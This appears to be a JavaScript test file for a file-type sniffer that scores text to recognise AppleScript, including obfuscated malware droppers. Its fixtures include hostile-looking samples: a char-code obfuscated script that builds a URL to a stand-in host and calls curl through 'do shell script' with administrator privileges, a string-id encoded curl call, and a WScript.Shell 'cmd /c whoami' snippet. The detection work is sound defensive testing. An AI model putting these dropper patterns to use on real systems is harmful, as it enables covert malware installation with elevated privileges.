'use strict';
// applescript-sniff.test.js — RendererRegistry._sniffAppleScript()
// score-based text heuristic. The sniff is the ONLY dispatch route
// that catches extensionless AppleScript (drag-dropped `clipboard.txt`
// from a paste, for example), so its score table has to survive both
// the classic `tell application "X"` shape and the heavy char-code
// obfuscation shape real-world droppers use.
//
// Score cutoff is ≥ 4 (lowered from 5 when the char-code/char-id/
// string-id/unquoted-do-shell-script signals were added). Verified:
//   • classic tell-application AppleScript scores well above cutoff
//   • obfuscated-dropper shape (heavy ASCII-character / character-id /
//     string-id chains + unquoted `do shell script`) clears cutoff
//   • Apache access_log line pattern is a -8 negative signal that
//     drops the score below cutoff even when weak positives fire.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/renderer-registry.js',
], { expose: ['RendererRegistry'] });
const { RendererRegistry } = ctx;

function ctxFor(text) { return { head4k: text }; }

// ── Classic unobfuscated AppleScript clears cutoff ──────────────────────

test('applescript-sniff: classic tell-application script is claimed', () => {
  const text = `
tell application "Finder"
  set frontWindow to window 1
  set target_folder to folder "Downloads" of home
end tell
on run
  display dialog "Hello"
end run
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), true);
});

test('applescript-sniff: quoted-form-of + do-shell-script clears cutoff', () => {
  const text = `
set _cmd to "curl -sL https://example.invalid/x"
set _quoted to quoted form of _cmd
do shell script _quoted with administrator privileges
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), true);
});

// ── Obfuscated-dropper shape: the file the bug report was filed against ──

test('applescript-sniff: obfuscated char-code dropper shape clears cutoff (paste scenario)', () => {
  // Mirrors the malicious.applescript sample shape the bug report is about:
  //   - `property _X : ((ASCII character N) & (character id N) & "literal" & …)`
  //   - `set _Y to do shell script ((ASCII character 47) & …)` — UNQUOTED do-shell-script argument
  //   - `with administrator privileges`
  //   - zero `tell application "X"` / `end tell` / `on run`
  // Under the old table this scored only 4 (do-shell-script required a quote);
  // under the new table the unquoted-do-shell + ascii-character + character-id
  // + admin-privileges signals stack to ≥ 10 and easily clear the cutoff.
  const text = `
set _oiIYgUT5TERxtex to 20003
property _iunwOBiubQuNWF : {((ASCII character 57) & (ASCII character 115) & "xgr" & (character id 118) & ".")}
set __UINuWFuoWfw to ((character id 104) & "t" & "tps" & ":" & (character id 47) & (ASCII character 47)) & "evil.invalid/"
set _OiohiuAlka to do shell script ((ASCII character 47) & (ASCII character 117) & (character id 115) & (character id 114) & "/bin/curl") with administrator privileges
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), true);
});

test('applescript-sniff: standalone string id {…} + set-to + property-colon clears cutoff', () => {
  const text = `
property _P : (string id {104, 116, 116, 112, 115, 58, 47, 47})
set _X to (string id {99, 117, 114, 108})
do shell script _X
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), true);
});

// ── Negative signal: Apache access_log must NOT be claimed ───────────────

test('applescript-sniff: Apache access_log line vetoes even with a set-to keyword', () => {
  // A log line the pasted-text Apache-highlighting bug was landing on.
  // Even if the log mentions `property_X :` or `set X to` in free text
  // (it doesn't, but to be conservative), the CLF-line pattern is a -8
  // negative that overwhelms any positive signal.
  const text =
    `127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2326\n` +
    `192.0.2.4 - - [11/Oct/2024:01:03:12 +0000] "POST /login HTTP/1.1" 302 0\n` +
    `property x : y\nset x to y\n`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), false);
});

// ── JScript / JSE disambiguator stays intact ─────────────────────────────

test('applescript-sniff: ActiveXObject-bearing script is NOT claimed', () => {
  const text = `
var sh = new ActiveXObject("WScript.Shell");
sh.Run("cmd /c whoami");
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), false);
});

test('applescript-sniff: bash shebang is NOT claimed', () => {
  const text = `#!/bin/bash
set -e
curl -sL https://example.com/x
`;
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), false);
});

// ── Below-cutoff benign text ─────────────────────────────────────────────

test('applescript-sniff: plain prose below cutoff', () => {
  const text = `
This is a note about setting an important property.
The property keeps the clipboard up to date.
`;
  // `set X to` does not match (no `\w[\w ]* to `), but `property X :`
  // fires (+1), `the clipboard` fires (+1). Total 2, below cutoff of 4.
  assert.equal(RendererRegistry._sniffAppleScript(ctxFor(text)), false);
});
